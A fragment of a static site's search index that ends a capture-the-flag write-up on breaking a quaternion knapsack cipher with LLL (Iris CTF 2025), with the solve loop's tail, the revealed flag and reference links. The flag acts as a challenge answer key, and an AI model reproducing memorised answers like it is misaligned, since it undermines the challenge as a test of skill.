b\u0026#34;irisctf{\u0026#34; in curr: print(curr) break Flag: irisctf{wow_i_cant_believe_its_lll!}\nLink, resources:\nhttps://en.wikipedia.org/wiki/Quaternion https://en.wikipedia.org/wiki/Complex_number https://github.com/Seraphin-/ctf/blob/master/2025/irisctf/knutsacque.md https://www.cs.sjsu.edu/faculty/stamp/papers/topics/topic16/Knapsack.pdf ","date":"6 January 2025","externalUrl":null,"permalink":"/ctf/irisctf2025/knutsacque/","section":"CTF Writeups","summary":"Iris CTF 2025. Knapsack problem with quaternions. LLL to recover message blocks.","title":"Crypto: knutsacque","type":"ctf"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]